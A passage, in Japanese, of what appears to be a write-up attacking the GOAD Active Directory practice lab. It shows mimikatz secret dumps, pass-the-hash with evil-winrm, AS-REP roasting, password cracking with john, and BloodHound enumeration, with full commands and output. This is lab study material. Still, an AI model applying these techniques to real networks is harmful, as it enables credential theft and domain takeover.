cur/hex : 22 34 01 76 01 70 30 93 88 a7 6b b2 87 43 59 69 0e 41 bd 22 0a 0c cc 23 3a 5b b6 74 cb 90 d6 35 14 ca d8 45 4a f0 db 72 d5 cf 3b a1 ed 7f 3a 98 cd 4d d6 36 6a 35 24 2d a0 eb 0f 8e 3f 52 81 c9 
old/hex : 22 34 01 76 01 70 30 93 88 a7 6b b2 87 43 59 69 0e 41 bd 22 0a 0c cc 23 3a 5b b6 74 cb 90 d6 35 14 ca d8 45 4a f0 db 72 d5 cf 3b a1 ed 7f 3a 98 cd 4d d6 36 6a 35 24 2d a0 eb 0f 8e 3f 52 81 c9 

Secret  : _SC_MSSQL$SQLEXPRESS / service 'MSSQL$SQLEXPRESS' with username : north.sevenkingdoms.local\sql_svc
cur/text: YouWillNotKerboroast1ngMeeeeee

Secret  : _SC_SQLTELEMETRY$SQLEXPRESS / service 'SQLTELEMETRY$SQLEXPRESS' with username : NT Service\SQLTELEMETRY$SQLEXPRESS

mimikatz #
```

ハッシュの取得に成功したのでPass-the-hashで入ってみる

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -u Administrator -H dbd13e1c4e338284ac4e9874f7de6ef4 -i castelblack
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

castelblackに関してはAdministrator権限が取れた

Bloodhoundを動かそうとしたが動かない。

他のユーザーで入って試す。

まずは他のユーザーを探す

```
┌──(kali㉿kali)-[~/goad/castelblack]
└─$ impacket-GetADUsers -all north.sevenkingdoms.local/jon.snow:iknownothing                             
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Querying north.sevenkingdoms.local for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2024-08-10 23:08:06.949368  2024-10-11 15:59:44.725602 
Guest                                                 <never>              <never>             
vagrant                                               2021-05-12 07:38:55.922520  2024-08-11 00:09:31.347502 
krbtgt                                                2024-08-10 23:24:52.237590  <never>             
                                                      2024-10-05 20:33:35.571923  <never>             
arya.stark                                            2024-08-10 23:42:04.471887  <never>             
eddard.stark                                          2024-08-10 23:42:06.722277  2024-10-11 22:30:53.930205 
catelyn.stark                                         2024-08-10 23:42:08.941111  <never>             
robb.stark                                            2024-08-10 23:42:11.065308  2024-10-11 22:32:00.399053 
sansa.stark                                           2024-08-10 23:42:13.018886  <never>             
brandon.stark                                         2024-08-10 23:42:14.850022  <never>             
rickon.stark                                          2024-08-10 23:42:16.693124  <never>             
hodor                                                 2024-08-10 23:42:18.518663  <never>             
jon.snow                                              2024-08-10 23:42:20.300231  <never>             
samwell.tarly                                         2024-08-10 23:42:22.175246  <never>             
jeor.mormont                                          2024-08-10 23:42:23.987353  <never>             
sql_svc                                               2024-08-10 23:42:25.706411  2024-10-11 22:04:56.621216 
```

よく考えてみたらDCはWinterfellだからWinterfellでSharpHound動かしたほうが良いのでは？

とりあえずnorth.sevenkingdoms.local/ でユーザーを探す

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ impacket-GetNPUsers north.sevenkingdoms.local/ -no-pass -usersfile users.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:35976c73e5060906dab8147e5b1d2744$c031e57e3027eff3cb057d019aea5eef51ced45a76744e48418951d7803eedea05caf1b9895cebee55c4f7504136e7729c16114a1d29b50085308b4d1ba22de8cb7f73610ede55094ed19453eb09f36d94af2b8261b6f63536bf25fb588a9e322340ad490821f4f2a0b884385a03b00467dd3e30d16bdfba1740c1eee7eafe3a239c8d73bcbee7b4b84bb78b402568de6dac8d3fa7b3b4bb6beaf8ac2e4cb356d087003117c44c81369aeaef75330f76a297376780a9ed2e98e106e42b6bb47967d59705c31ac82896f7045afd17d3469a1b18fb0429ca162577ef8facb7280b826abed3b7cd8c6aaabe6eaf07e204a46560968511cada085a5d9c4b128d95dd84e8194ada27
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User eddard.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set
```

johnにかけたら一瞬でハッシュが解けた

```
┌──(kali㉿kali)-[~/goad/winterfell]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt brandon.stark.krb5asrep.hash                                  
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iseedeadpeople   ($krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL)     
1g 0:00:00:00 DONE (2024-10-11 22:46) 5.555g/s 301511p/s 301511c/s 301511C/s soydivina..250984
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

`brandon.stark/iseedadpeople` という認証情報ゲット。

north.sevenkingdoms.local のドメインに所属しているユーザーの認証情報を取得できたのでこれでbloodhoundできるか試してみる。

resolve.conf にname serverを追加して試す(たぶんnsフラグでいいと思うが)

```
┌──(kali㉿kali)-[~/goad/winterfell/bloodhound]
└─$ cat /etc/resolv.conf 
# Generated by NetworkManager
nameserver 10.0.2.3
nameserver 192.168.56.10
```

bloodhound-pythonが正常に動いた

```
┌──(kali㉿kali)-[~/goad/winterfell/bloodhound]
└─$ bloodhound-python --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local
INFO: Found AD domain: north.sevenkingdoms.local
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: winterfell.north.sevenkingdoms.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 2 computers
INFO: Connecting to GC LDAP server: winterfell.north.sevenkingdoms.local
INFO: Connecting to LDAP server: winterfell.north.sevenkingdoms.local
INFO: Found 17 users
INFO: Found 51 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: castelblack.north.sevenkingdoms.local
INFO: Querying computer: winterfell.north.sevenkingdoms.local
INFO: Done in 00M 00S
INFO: Compressing output into 20241011225036_bloodhound.zip
```

この調子で他のドメインの情報も集めていく

所属しているドメインの情報を含めないと弾かれるので注意

```
┌──(kali㉿kali)-[~/goad/winterfell/bloodhound]
└─$ bloodhound-python --zip -c All -d sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc kingslanding.sevenkingdoms.local
INFO: Found AD domain: sevenkingdoms.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: kingslanding.sevenkingdoms.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: kingslanding.sevenkingdoms.local
INFO: Found 16 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 9 ous
INFO: Found 19 containers
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: kingslanding.sevenkingdoms.local
INFO: Done in 00M 00S
INFO: Compressing output into 20241011225327_bloodhound.zip
```

次はessos.local

```
┌──(kali㉿kali)-[~/goad/winterfell/bloodhound]
└─$ bloodhound-python --zip -c All -d essos.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc meereen.essos.local
INFO: Found AD domain: essos.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: meereen.essos.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: meereen.essos.local
INFO: Found 14 users
INFO: Found 59 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: braavos.essos.local
INFO: Querying computer: meereen.essos.local
INFO: Done in 00M 00S
INFO: Compressing output into 20241011225440_bloodhound.zip
```

bloodhoundで表示できるようになった。

3つのzipファイルを入れたらいい感じにドメイン間の関係性とか表示してくれて良い。
